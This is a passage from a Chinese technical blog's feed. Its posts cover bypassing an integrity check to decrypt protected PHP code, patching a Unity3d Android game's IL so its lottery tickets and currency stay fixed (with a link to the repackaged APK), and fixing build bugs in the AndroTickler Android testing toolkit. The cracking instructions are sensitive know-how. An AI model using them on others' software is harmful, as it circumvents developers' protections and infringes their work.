alt="20"><br>直接查看返回值。<br><img src="21.jpg" alt="21"><br>第34行对应的代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!strpos(decode_func(substr($f, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($f, <span class="number">0</span>, <span class="number">-46</span>))) ? $undefined1() : $undefined2;</span><br></pre></td></tr></table></figure><p><code>decode_func</code>是第52行的函数，$f是当前的文件，<code>$undefined1</code>和 <code>$undefined2</code>都不存在。查看<code>strpos</code>中两个参数。<br><img src="22.jpg" alt="22"><br>那么 <code>! strops(string,find)</code> 的结果为true。则执行<code>$undefined1()</code>，这个方法不存在，就会Error并退出程序。如下图所示。<br><img src="23.jpg" alt="23"><br>解决方法是注释第34行或者将”!”去掉。去掉”!”会执行 <code>$undefined2</code>，只会警告而不会退出。这里采用”暴力”的手段，直接注释掉了。<br>然后重新执行程序，F5运行到断点后，F11进入，然后F10运行。<br>运行到38行时，查看返回的内容，是源文件的内容。这个内容就是我们需要的。<br><img src="24.jpg" alt="24"><br>可以通过file_put_contents将文件保存即可。<br><img src="25.jpg" alt="25"><br>查看输出的结果。<br><img src="26.jpg" alt="26"><br>也可以在第102行用file_put_contents将文件保存。<br>使用原作者的decrypt.php也可解密。执行命令：<code>php decrypt.php 9014\t.php</code>，会生成解密后的文件”t.php.decrypted.php”。<br><img src="27.jpg" alt="27"></p><h4 id="2-LIB库加密"><a href="#2-LIB库加密" class="headerlink" title="2._LIB库加密"></a>2._LIB库加密</h4><p>调试过程和独立加密类似。<br><img src="28.jpg" alt="28"><br>还用之前的t.php作为源文件，加密后生成两个文件，一个是t.php，一个是_lib.php。<br><img src="29.jpg" alt="29"><br>这里的t.php就比较简单了，直接调用了_lib.php文件。主要研究的还是_lib.php文件。老规矩，还是先格式化。新建文件夹viptest，将t.php和格式化后的_lib.php复制进去。然后对格式化后的_lib.php进行编码转换。下断点开始进行调试。这里断点为106行。<br>然后浏览器访问，就会在断点处停止。F11进入后F10单步跳过。<br><img src="30.jpg" alt="30"><br>运行至第43行时退出，直接屏蔽这几行即可。然后重新访问。<br><img src="31.jpg" alt="31"><br>运行至第46行，校验数据完整性，由于_lib.php是格式化而来的代码，所以此处校验不通过，就会调用不存在的方法，然后产生错误而退出。<br>执行的代码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$f = file_get_contents(<span class="string">'_lib.php'</span>);</span><br><span class="line">!strpos(decode_func(substr($f, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($f, <span class="number">0</span>, <span class="number">-46</span>))) ? $undefined1() : $undefined2;</span><br></pre></td></tr></table></figure><p><img src="32.jpg" alt="32"><br>注释该校验即可。<br>继续执行，查看返回即可看到加密前的代码了。<br><img src="33.jpg" alt="33"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>类似此类的加密文件在进行调试时需要先将代码格式化，选择不是多字节的字符集，然后进行调试。我的测试流程是首先在开始下断点，然后F10执行，当遇到程序退出时，在此处下断点，再次运行，运行到此处F11进入。进入后F10执行，找到问题所在解决后重复上述流程。</p><p>这里都是以免费加密为例，关于VIP加密的可以参考作者的文章<a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">【原创】某PHP加密文件调试解密过程</a> ，还有他的虚拟机加密解密的文章也值得学习。</p><p><a href="https://fuping.site/files/ctf.7z">所用的代码</a></p><h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-693641-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在52PJ上看到一篇关于PHP加密解密的帖子，过程非常详细，而且作者很负责，对于别人的回答也很热心。跟着动手做了一下，记录一下遇到的问题。这里针对的是PHP加密网站的免费加密进行的调试。&lt;/p&gt;
    
    </summary>
    
    
      <category term="编程之美" scheme="https://fuping.site/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BE%8E/"/>
    
    
      <category term="PHP解密" scheme="https://fuping.site/tags/PHP%E8%A7%A3%E5%AF%86/"/>
    
      <category term="PHP调试" scheme="https://fuping.site/tags/PHP%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Unity3d类安卓游戏逆向分析初探</title>
    <link href="https://fuping.site/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/"/>
    <id>https://fuping.site/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/</id>
    <published>2018-01-31T12:40:26.000Z</published>
    <updated>2018-01-31T14:23:24.529Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>最近一款养蛙的游戏非常火，但是语言是日文的。下载了一个汉化的，结果广告一大堆。反编译之后查看是Unity游戏，之前没接触过，就想着跟着看一下。关于这类的破解，可以在52pojie上进行搜索。有很多类似的案例。<br>这里主要采用的工具为dnSpy，dnSpy 是一款针对 .NET 程序的逆向工程工具。反编译和打包采用的是apktool，当然也可以直接用改之理等工具。</p><a id="more"></a><h3 id="0x02-修改数据"><a href="#0x02-修改数据" class="headerlink" title="0x02 修改数据"></a>0x02 修改数据</h3><p>下载app后重命名为zip文件，发现存在assets\bin\Data\Managed目录，那么该游戏应该为Unity游戏。<br><img src="1.jpg" alt="查看apk文件"><br>那么需要分析的文件就是就是Assembly-CSharp.dll。</p><p>首先修改一下抽奖券的数量。安装游戏后，找到抽奖的地方。抽奖的时候提示券不足。<br><img src="2.jpg" alt="抽奖券不足"></p><p>使用dnSpy打开Assembly-CSharp.dll文件，然后搜索字符串”足”，可以发现有两个，打开后发现是第一个。<br><img src="3.jpg" alt="搜索字符串"><br>由此可以猜测TicketStock代表抽奖券库存。<br><img src="4.jpg" alt="抽奖券库存"><br>ticket表示抽奖券数量。<br><img src="5.jpg" alt="抽奖券数量"><br>当页查找ticket，发现有一个initialize方法进行初始化。我们将此处的数量改为1000.<br><img src="6.jpg" alt="初始化方法"><br>快捷键Ctrl+E编辑IL指令。找到ticket变量后，将ldc.i4.0改为ldc.i4，然后将数值改为1000.<br><img src="7.jpg" alt="编辑IL指令"><br>确定后，发现ticket数值已经改变。<br><img src="8.jpg" alt="抽奖券修改"><br>重新打包APP后，进行安装。<br><img src="9.png" alt="抽奖券改变"><br>打开抽奖界面发现数量已经改变为1000。<br><img src="10.png" alt="抽奖后抽奖券变动"><br>这样虽然达到了修改抽奖券的效果，但数量再大，总会被抽完的。那就换种方法，比如说抽奖的时候增加奖券，或者奖券一直不变。这里采用奖券数量固定的方法，使其不会变动。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SuperGameMaster.TicketStock() &lt; <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ConfilmPanel confilm = <span class="keyword">this</span>.ConfilmUI.GetComponent&lt;ConfilmPanel&gt;();</span><br><span class="line">    confilm.OpenPanel(<span class="string">"ふくびき券が足りません"</span>);</span><br><span class="line">    confilm.ResetOnClick_Screen();</span><br><span class="line">    confilm.SetOnClick_Screen(delegate</span><br><span class="line">    &#123;</span><br><span class="line">        confilm.ClosePanel();</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>已知抽奖的时候奖券是从SuperGameMaster.TicketStock()获取的，找到该方法。令其返回值为固定的数值。<br><img src="11.jpg" alt="TicketStock方法"><br>右键编辑IL指令。<br><img src="12.jpg" alt="编辑IL指令"><br>将其值修改为9000.<br><img src="13.jpg" alt="修改返回值"><br>然后保存后打包并重新安装。<br><img src="14.png" alt="打包安装"><br>此时无论抽多少次，奖券都不再变化。<br>另一个就是修改三叶草的数量了。三叶草是该游戏中流行的货币，买东西都是需要该物品。同理找到CloverPointStock()方法。<br><img src="15.jpg" alt="修改三叶草"><br>将其返回值修改为8888。之后就可以随便买买买了，三叶草的数量也不会发生变化了。<br><img src="16.png" alt="三叶草数量"></p><h3 id="0x03-汉化"><a href="#0x03-汉化" class="headerlink" title="0x03 汉化"></a>0x03 汉化</h3><p>然后就是进行汉化了。汉化的方法和上面的类似。首先搜索需要修改的文字。例如给小青蛙起名字的时候。直接进行字符串搜索。<br><img src="17.jpg" alt="查找文字"><br>然后修改为对应的中文就行了。<br><img src="18.jpg" alt="日文修改为对应的中文"><br>进入游戏查看。<br><img src="19.png" alt="文字替换成功"><br>修改其他处的文字也是这样操作即可。当然这种修改方法比较慢，还有另外一种，直接将他人汉化过的dll文件复制进来，可以快速达到汉化的目的，也没有广告的烦恼了。</p><h3 id="0x04-其他修改"><a href="#0x04-其他修改" class="headerlink" title="0x04 其他修改"></a>0x04 其他修改</h3><p>按照以上方法修改的时候，每次都需要重新玩，还要经过”新手教学阶段”。我们可以使用安卓的备份功能，进行备份。然后重新安装app后直接恢复备份即可。<br>首先需要在AndroidManifest.xml文件中增加<code>android:allowBackup=&quot;true&quot;</code>。<br><img src="20.jpg" alt="修改AndroidManifest.xml文件"><br>这样就可以使用备份命令了。<br>命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb backup -nosystem -noshared -noapk -f jp.co.hit_point.tabikaeru.ab jp.co.hit_point.tabikaeru</span><br><span class="line">//-nosystem表示不备份系统应用 -noshared表示不备份应用存储在SD中的数据 -noapk表示不备份应用APK安装包 -f 表示备份的.ab文件路径和文件名 最后是要备份应用的packageName</span><br></pre></td></tr></table></figure><p><img src="23.jpg" alt="备份和恢复"><br>手机备份操作界面：<br><img src="21.png" alt="备份数据"></p><p>恢复命令比较简单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb restore jp.co.hit_point.tabikaeru.ab</span><br></pre></td></tr></table></figure><p>手机备份还原界面<br><img src="22.png" alt="恢复数据"></p><p>然后就可以进行进度的保存和恢复了。就省去了每次都要进行”新手教学”的烦恼。</p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>这个游戏修改起来比较简单，首先判断为该游戏为Unity3d。然后使用dnSpy来对Assembly-CSharp.dll文件进行修改。根据特定的字符串找到需要修改的位置，修改后进行打包签名后即可。<br><a href="https://fuping.site/files/jp.co.hit_point.tabikaeru.apk">原版APK</a><br><a href="https://fuping.site/files/tabikaeru.apk">修改后的APK</a>（修改了抽奖券、三叶草和部分汉化）</p><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="https://www.52pojie.cn/search.php?mod=forum&amp;searchid=23262&amp;orderby=lastpost&amp;ascdesc=desc&amp;searchsubmit=yes&amp;kw=unity3d" target="_blank" rel="noopener">https://www.52pojie.cn/search.php?mod=forum&amp;searchid=23262&amp;orderby=lastpost&amp;ascdesc=desc&amp;searchsubmit=yes&amp;kw=unity3d</a><br>[2] <a href="https://www.52pojie.cn/thread-647612-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-647612-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;最近一款养蛙的游戏非常火，但是语言是日文的。下载了一个汉化的，结果广告一大堆。反编译之后查看是Unity游戏，之前没接触过，就想着跟着看一下。关于这类的破解，可以在52pojie上进行搜索。有很多类似的案例。&lt;br&gt;这里主要采用的工具为dnSpy，dnSpy 是一款针对 .NET 程序的逆向工程工具。反编译和打包采用的是apktool，当然也可以直接用改之理等工具。&lt;/p&gt;
    
    </summary>
    
    
      <category term="移动安全" scheme="https://fuping.site/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Unity3d" scheme="https://fuping.site/tags/Unity3d/"/>
    
      <category term="青蛙旅行" scheme="https://fuping.site/tags/%E9%9D%92%E8%9B%99%E6%97%85%E8%A1%8C/"/>
    
      <category term="逆向分析" scheme="https://fuping.site/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>安卓渗透利器AndroTickler使用排雷指北</title>
    <link href="https://fuping.site/2018/01/03/How-To-Use-AndroTickler/"/>
    <id>https://fuping.site/2018/01/03/How-To-Use-AndroTickler/</id>
    <published>2018-01-03T02:07:00.000Z</published>
    <updated>2018-01-04T05:41:43.011Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>AndroTickler是一款用于Android应用程序渗透测试和审计的工具包。更多介绍可以参考<a href="https://github.com/ernw/AndroTickler" target="_blank" rel="noopener">https://github.com/ernw/AndroTickler</a> 。本文主要记录一下在使用过程中所遇到的问题和解决的方法。</p><p>本文的测试环境如下：系统为win10 x64，jdk版本为java8，gradle版本为4.1。采用了夜神模拟器。</p><p>主要包括以下几个方面。</p><ol><li>编译环境的准备</li><li>使用过程中遇到的问题以及解决方法</li></ol><a id="more"></a><h1 id="0x02-编译环境的准备"><a href="#0x02-编译环境的准备" class="headerlink" title="0x02 编译环境的准备"></a>0x02 编译环境的准备</h1><h2 id="1-Gradle的安装"><a href="#1-Gradle的安装" class="headerlink" title="1. Gradle的安装"></a>1. Gradle的安装</h2><p>首先需要安装Java，我采用的是Java8（安装工具说明，需要Java7以上）。下载地址：<a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a> 。（安装过程省略）</p><p>关于gradle的安装可以参考<a href="https://gradle.org/install/" target="_blank" rel="noopener">https://gradle.org/install/</a> ，我这里是直接下载安装包<a href="https://services.gradle.org/distributions/gradle-4.4.1-bin.zip，" target="_blank" rel="noopener">https://services.gradle.org/distributions/gradle-4.4.1-bin.zip，</a> 解压之后添加环境变量。<br><img src="gradle%E5%AE%89%E8%A3%85.jpg" alt="gradle安装"></p><h2 id="2-cmder工具安装"><a href="#2-cmder工具安装" class="headerlink" title="2. cmder工具安装"></a>2. cmder工具安装</h2><p>该步骤非必需，可以省略。<br>下载地址：<a href="https://github.com/cmderdev/cmder/releases/" target="_blank" rel="noopener">https://github.com/cmderdev/cmder/releases/</a><br>解压添加环境变量即可使用。<br><img src="cmder%E5%B7%A5%E5%85%B7.jpg" alt="cmder工具"></p><blockquote><p>使用该工具除了界面好看外，可以多个tab，也可以运行部分linux命令。当然也可以使用其他工具，如cygwin。如果没有使用这类工具的话，需要将代码中一些命令修改，如<code>cp</code>命令。</p></blockquote><h2 id="3-Git工具安装"><a href="#3-Git工具安装" class="headerlink" title="3. Git工具安装"></a>3. Git工具安装</h2><p>该步骤非必需，可以省略。<br>下载地址：<a href="https://desktop.github.com/" target="_blank" rel="noopener">https://desktop.github.com/</a><br>安装即可。然后下载 <a href="https://github.com/ernw/AndroTickler" target="_blank" rel="noopener">AndroTickler</a><br><img src="%E4%B8%8B%E8%BD%BD.jpg" alt="下载"></p><h2 id="4-其他工具安装"><a href="#4-其他工具安装" class="headerlink" title="4.其他工具安装"></a>4.其他工具安装</h2><p>还需要安装adb, sqlite3, strings等工具。<br>adb的话安装夜神模拟器的时候自动，名字为nox_adb，功能一样。<br>sqlite3可以用<a href="https://www.sqlite.org/" target="_blank" rel="noopener">https://www.sqlite.org/</a> 下载。<br>strings的官网，<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/strings" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/strings</a> ，下载地址为：<br><a href="https://download.sysinternals.com/files/Strings.zip" target="_blank" rel="noopener">https://download.sysinternals.com/files/Strings.zip</a> 。解压后加入环境变量即可。</p><p>然后就是开始编译和使（入）用（坑）了。</p><h1 id="0x03-使用过程中遇到的问题以及解决方法"><a href="#0x03-使用过程中遇到的问题以及解决方法" class="headerlink" title="0x03 使用过程中遇到的问题以及解决方法"></a>0x03 使用过程中遇到的问题以及解决方法</h1><p>上面环境已经搭建好了，代码也下载了，然后就开始入坑吧。<br>编译的话很简单，使用命令<code>gradle &amp;&amp; gradle build</code>即可。<br><img src="%E7%BC%96%E8%AF%91.jpg" alt="编译"><br>然后会在build\libs目录下生成AndroTickler.jar文件。</p><p>软件生成了，那么看看有什么功能吧，使用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar AndroTickler.jar -h</span><br></pre></td></tr></table></figure><p><img src="%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9.jpg" alt="使用帮助"></p><p>貌似一切正常。下面开始查看安装的app。</p><p>使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar AndroTickler.jar -pkgs</span><br></pre></td></tr></table></figure><p><img src="%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E7%9A%84app1.jpg" alt="查看安装的app1"></p><p>并没有返回安装的app<br>已知列出已经安装的app命令是<code>adb shell pm list package</code><br>而我用的模拟器，所以应该使用命令是<code>nox_adb shell pm list package</code><br><img src="%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E7%9A%84app2.jpg" alt="查看安装的app2"><br>所以这里要替换程序中的adb为nox_adb。<br>这里我用idea来打开代码<br>然后将命令中的<code>adb</code>替换为<code>nox_adb</code>即可<br><img src="%E6%9B%BF%E6%8D%A2adb%E5%91%BD%E4%BB%A4.jpg" alt="替换adb命令"><br>替换后重新编译并查看已安装的app。<br><img src="%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E7%9A%84app3.jpg" alt="查看安装的app3"></p><p>发现列出了安装过的app。虽然有警告，暂且不管。<br>查找特定的app并查看信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar AndroTickler.jar -findPkg com.example.simpleencryption</span><br><span class="line">java -jar AndroTickler.jar -pkg com.example.simpleencryption -info</span><br></pre></td></tr></table></figure><p><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF.jpg" alt="查看app信息"></p><p>发现报错，提示没有连接的设备。<br>通过adb查看连接的设备。<br><code>nox_adb devices -l</code><br><img src="%E8%BF%9E%E6%8E%A5%E7%9A%84%E8%AE%BE%E5%A4%87.jpg" alt="连接的设备"><br>发现有，但是使用工具未查看到。<br>通过错误的信息，定位到initialization\TicklerChecks.java的checkDevices方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkDevices</span><span class="params">()</span> <span class="keyword">throws</span> TNotFoundEx</span>&#123;</span><br><span class="line">String command = <span class="string">"nox_adb devices -l"</span>;</span><br><span class="line">Commando commando = <span class="keyword">new</span> Commando();</span><br><span class="line">String op = commando.executeCommand(command);</span><br><span class="line"></span><br><span class="line">OtherUtil oU = <span class="keyword">new</span> OtherUtil();</span><br><span class="line">ArrayList&lt;String&gt; devices = oU.getRegexFromString(op, <span class="string">"(model:.*?device:.+$?)"</span>);</span><br><span class="line"><span class="keyword">int</span> eligDevices = devices.size();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (eligDevices&gt;<span class="number">1</span>)</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> TNotFoundEx(<span class="string">"ERROR: 2 or more Android devices are connected to the host, please connect only one Android device."</span>);</span><br><span class="line"><span class="keyword">if</span> (eligDevices == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> TNotFoundEx(<span class="string">"ERROR: No Android devices detected by the host. Execute adb devices -l to check the connected devices"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现通过命令查询的结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List of devices attached</span><br><span class="line">127.0.0.1:62025        device</span><br></pre></td></tr></table></figure><p>明显通过正则不能匹配，那就改正则了。<br>为了方便，直接改为<code>ArrayList&lt;String&gt; devices = oU.getRegexFromString(op, &quot;(.*device\\n)&quot;);</code></p><p>然后编译运行。<br><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF1.jpg" alt="查看app信息1"><br>这个提示libs需要和jar文件在同一目录。将Tickler.conf和libs复制到与AndroTickler.jar同一目录。<br><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF2.jpg" alt="查看app信息2"><br>竟然报同样的错误，而且该目录下出现了一个H的文件夹。<br>通过错误的信息，定位到initialization\TicklerChecks.java的checkExternalLibDir方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkExternalLibDir</span><span class="params">()</span> <span class="keyword">throws</span> TNotFoundEx</span>&#123;</span><br><span class="line">String jarLoc = <span class="keyword">this</span>.getJarLocation();</span><br><span class="line">String libDirLoc=jarLoc+TicklerConst.generalLibName;</span><br><span class="line">File tickLib = <span class="keyword">new</span> File (libDirLoc);</span><br><span class="line"><span class="keyword">if</span> (tickLib.exists())&#123;</span><br><span class="line">TicklerVars.isLib = <span class="keyword">true</span>;</span><br><span class="line">TicklerVars.libDir = libDirLoc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Lib directory not found</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> TNotFoundEx(<span class="string">"Lib directory not found. \nMake sure that "</span>+TicklerConst.generalLibName+<span class="string">" directory exists in the same directory as Tickler.jar"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看代码，tickLib由jarLoc和TicklerConst.generalLibName拼接，而<code>TicklerConst.generalLibName</code>是常量，所以需要查看<code>jarLoc</code>是如何获取的。跟进getJarLocation方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getJarLocation</span><span class="params">()</span></span>&#123;</span><br><span class="line">File myJar;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">File myJar1 = <span class="keyword">new</span> File(System.getProperty(<span class="string">"java.class.path"</span>));<span class="comment">//获取jar路径</span></span><br><span class="line">myJar = myJar1.getAbsoluteFile().getParentFile();<span class="comment">//获取jar上级目录</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">myJar = <span class="keyword">new</span> File(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String jarLoc = <span class="keyword">this</span>.correctJarLoc(myJar.getAbsolutePath());</span><br><span class="line"><span class="keyword">return</span> jarLoc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先获取了运行的jar的路径，然后获取其父路径并将其值赋值给myJar。然后调用了correctJarLoc方法。<br>进行跟进correctJarLoc方法，进去查看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">correctJarLoc</span><span class="params">(String jarLoc)</span></span>&#123;</span><br><span class="line">String finalLoc=jarLoc;</span><br><span class="line"><span class="keyword">if</span> (jarLoc.contains(<span class="string">":"</span>))<span class="comment">//wtf?  造成问题的代码</span></span><br><span class="line">finalLoc = jarLoc.substring(<span class="number">0</span>, jarLoc.indexOf(<span class="string">":"</span>));<span class="comment">//wtf?  造成问题的代码</span></span><br><span class="line"></span><br><span class="line">Matcher m = Pattern.compile(<span class="string">"\\s+(.+)"</span>).matcher(jarLoc);</span><br><span class="line"><span class="keyword">if</span> (m.find())</span><br><span class="line">finalLoc = m.group(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (finalLoc.matches(<span class="string">".+\\n$"</span>))&#123;</span><br><span class="line">finalLoc = finalLoc.substring(<span class="number">0</span>, jarLoc.length()-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (finalLoc.matches(<span class="string">".+\\.$"</span>))&#123;</span><br><span class="line">finalLoc = finalLoc.substring(<span class="number">0</span>, jarLoc.length()-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!finalLoc.matches(<span class="string">".+/$"</span>))&#123;</span><br><span class="line">finalLoc = finalLoc+<span class="string">"/"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> finalLoc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后立马发现问题的所在了。这里因为是windows系统，所以路径出现<code>:</code>是很正常的，而这里直接截取了盘符。<br>这就是出现了一个名为H的文件夹的原因。<br>解决方法：删除这两行代码即可。<br>之后再编译运行。<br><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF3.jpg" alt="查看app信息3"><br>编译运行后发现警告没了，但新的错误出现了。<br>通过错误信息定位到apk\ApkToolClass.java的apkToolDecode方法。暂时先利用下面代码替换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//File file = new File("/dev/null");</span></span><br><span class="line">File file = <span class="keyword">new</span> File(<span class="string">"H:\\tmp\\"</span>);</span><br></pre></td></tr></table></figure><blockquote><p>从之后文件的内容来看，该文件里面会记录一些操作记录。</p></blockquote><p>再次编译运行，没有任何结果信息也没有报错。<br><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF4.jpg" alt="查看app信息4"><br>而在Tickler_workspace\com.example.simpleencryption\logs.pullLog.log发现了这样的日志。<br><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF5.jpg" alt="查看app信息5"><br>安装过的app保存位置为：<code>/data/app</code><br><img src="%E5%AE%89%E8%A3%85%E8%BF%87%E7%9A%84app.jpg" alt="安装过的app"><br>修改Tickler.conf文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Tickler_local_directory &#x3D; H:&#x2F;workspace&#x2F;eclipse&#x2F;AndroTickler&#x2F;build&#x2F;libs&#x2F;</span><br><span class="line">Tickler_sdcard_directory &#x3D; &#x2F;data&#x2F;app&#x2F;</span><br><span class="line">Frida_server_path &#x3D; &#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server-10.3.14-android-arm</span><br></pre></td></tr></table></figure><p>编译运行，没有报错，查看Tickler_workspace\com.example.simpleencryption\logs.pullLog.log文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cannot create &#39;H:\workspace\eclipse\AndroTickler\build\libs\com.example.simpleencryption\\&#39;: Not a directory</span><br></pre></td></tr></table></figure><p>然后通过调试，来寻找错误的地方（这里的图为之前调试的图( ╯□╰ )）</p><p><img src="%E5%AF%BC%E5%87%BAapk%E9%94%99%E8%AF%AF.jpg" alt="导出apk错误"></p><p>执行的命令为：<code>nox_adb pull /data/app/com.jnu.ctf2017-1.apk 